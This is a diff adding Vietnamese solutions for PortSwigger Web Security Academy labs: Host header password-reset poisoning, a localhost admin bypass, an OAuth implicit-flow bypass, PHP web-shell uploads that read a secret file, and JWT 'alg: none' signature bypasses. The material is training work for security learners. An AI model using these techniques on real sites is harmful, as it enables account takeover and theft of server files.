@@ -378,4 +378,47 @@ Khi đăng ký nhận tin qua email, nhận được thêm 1 COUPON giảm giá 
 ![Business logic vulnerabilities_4](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/Business%20logic%20vulnerabilities_4.png)  
   
 ## HTTP Host header attacks
-### Lab 01: 
+### Lab 01: Basic password reset poisoning
+Sử dụng chức năng **Forgot your password?** với tài khoản **wiener**, nhận được email có link dạng:  
+>https://0af50052039fbc92c03bf18d00e8002b.web-security-academy.net/forgot-password?temp-forgot-password-token=hpjfJ3JDGyGN5S6poUsPqF5XphBmZ2tZ  
+Truy cập link để reset mật khẩu.
+Dùng Burp Suite bắt gói tin khi sử dụng chức năng **Forgot your password?**:  
+  
+![HTTP Host header attacks_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/HTTP%20Host%20header%20attacks_1.png)  
+  
+Khi thay đổi Host header, trang web vẫn gửi link reset password vì vậy thay Host header thành địa chỉ của **Exploit Server** và thay **username** thành **carlos**. Truy cập access log để lấy tham số **temp-forgot-password-token** cho tài khoản carlos. Truy cập địa chỉ thay đổi password với tham số **temp-forgot-password-token** của tài khoản **carlos** để đổi mật khẩu.  
+### Lab 02: Host header authentication bypass
+Đổi Host header thành **localhost**, gửi request **/admin/delete?username=carlos**  
+## OAuth authentication
+### Lab 01: Authentication bypass via OAuth implicit flow
+Sử dụng Burp Suite bắt gói tin khi thực hiện đăng nhập bằng bằng email, thay đổi email và tên tài khoản thành **carlos@carlos-montoya.net** và **carlos**:  
+  
+![OAuth authentication_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/OAuth%20authentication_1.png)  
+  
+## File upload vulnerabilities
+### Lab 01: Remote code execution via web shell upload
+Upload cmd.php:  
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```  
+### Lab 02: Web shell upload via Content-Type restriction bypass
+Upload cmd.png:  
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```  
+Sử dụng Burp Suite chặn gói tin upload file **cmd.png**, thay đuôi file thành **cmd.php**  
+## JWT
+### Lab 01: JWT authentication bypass via unverified signature
+Sử dụng extension JWT Editor của Burp Suite, thay đổi thông tin:  
+  
+![JWT_1](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/JWT_1.png)  
+  
+### Lab 02: JWT authentication bypass via flawed signature verification
+Sử dụng extension JWT Editor của Burp Suite, thay đổi thông tin **"alg": "none"** và **"sub": "administrator"**:  
+  
+![JWT_2](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/JWT_2.png)  
+  
+Xóa hết đoạn Signature trong header session:  
+  
+![JWT_3](https://github.com/ckiev5/portswigger_labs/blob/main/Images/Apprentice/JWT_3.png)  
+  
